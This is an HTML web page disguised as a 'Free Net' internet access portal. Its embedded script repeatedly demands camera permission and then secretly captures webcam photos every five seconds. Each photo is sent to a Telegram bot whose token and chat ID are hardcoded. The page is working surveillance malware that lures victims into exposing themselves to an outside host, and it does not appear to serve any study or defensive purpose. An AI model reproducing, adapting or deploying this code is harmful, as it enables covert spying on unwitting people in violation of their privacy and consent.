<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Net Access</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://via.placeholder.com/1920x1080?text=Free+Net+Page') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2rem;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1rem;
            border: none;
            border-radius: 5px;
            background-color: #28a745;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Free Net</h1>
        <p>Allow camera access to continue.</p>
        <button id="startButton">Start</button>
    </div>

    <script>
        const startButton = document.getElementById('startButton');
        const chat_id = '5998202830'; // Replace with your Telegram Chat ID
        const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your Telegram Bot Token
        const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                alert("Camera access granted. Capturing photos...");
                captureAndSendPhotos(stream);
            } catch (error) {
                alert("Camera access denied. Please allow camera access to continue.");
                requestCamera(); // Keep requesting permission until granted
            }
        }

        function captureAndSendPhotos(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob);

                    fetch(telegramURL, {
                        method: 'POST',
                        body: formData,
                    })
                    .then(response => {
                        if (!response.ok) {
                            console.error("Failed to send photo.");
                        }
                    })
                    .catch(error => console.error("Error:", error));
                }, 'image/jpeg');
            }, 5000); // Capture and send photo every 5 seconds
        }

        startButton.addEventListener('click', requestCamera);
    </script>
</body>
</html>
